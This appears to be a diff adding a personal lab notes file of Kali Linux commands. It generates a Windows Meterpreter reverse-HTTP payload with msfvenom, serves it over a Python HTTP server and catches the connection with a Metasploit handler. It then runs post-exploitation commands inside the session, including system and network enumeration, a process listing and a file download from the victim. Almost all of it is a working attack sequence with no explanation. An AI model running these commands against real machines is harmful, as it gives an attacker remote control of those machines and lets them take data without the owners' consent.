@@ -1,0 +1,24 @@
+kali commands: 
+mkdir -p ~/reverse_engineering_lab
+cd ~/reverse_engineering_lab
+msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.1.10 LPORT=4444 -f raw -o payload.bin
+python3 -m http.server 8000 --bind 0.0.0.0
+
+msfconsole -q
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_http
+set LHOST 192.168.1.10
+set LPORT 4444
+set ExitOnSession false
+run -j
+
+sessions -i 1
+sysinfo
+getuid
+ipconfig
+arp
+netstat
+ps
+download C:\\Windows\\System32\\drivers\\etc\\hosts
+
+
